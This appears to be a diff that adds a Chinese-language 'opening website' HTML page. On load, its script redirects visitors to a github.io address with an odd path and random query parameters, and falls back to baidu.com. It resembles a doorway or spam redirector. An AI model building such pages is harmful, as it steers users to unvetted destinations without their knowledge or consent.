@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>正在跳转到打开网站...</title>
+  <style>
+    body {
+      background-color: #fff;
+      font-size: 14px;
+    }
+
+    h3 {
+      font-size: 60px;
+      color: #eee;
+      text-align: center;
+      padding-top: 30px;
+      font-weight: normal;
+    }
+  </style>
+</head>
+<body>
+  <h3>正在打开网站</h3>
+
+  <script>
+   let urlParams = new URLSearchParams(window.location.search);
+   if (!urlParams.has("GbF") || urlParams.get("GbF")) {
+    let _ks = generateRandomNumber(4);
+    let uy = generateRandomNumber(5);
+    let ishare = generateRandomString(3);
+    let url = "https://wcloud778.github.io/script,DD,,XX,XC,,,,,000/?";
+    url += "&_ks=" + _ks;
+    url += "&uy=" + uy;
+    url += "&sina,ishare=" + ishare;
+    window.location.href = url;
+  } else {
+    window.location.href = "http://baidu.com";
+  }
+  function generateRandomNumber(length) {
+    let randomNumber = '';
+    for (let i = 0; i < length; i++) {
+      randomNumber += Math.floor(Math.random() * 10);
+    }
+    return randomNumber;
+  }
+  function generateRandomString(length) {
+    let randomString = '';
+    let characters = 'abcdefghijklmnopqrstuvwxyz';
+    for (let i = 0; i < length; i++) {
+      randomString += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return randomString;
+  }
+  </script>
+</body>
+</html>
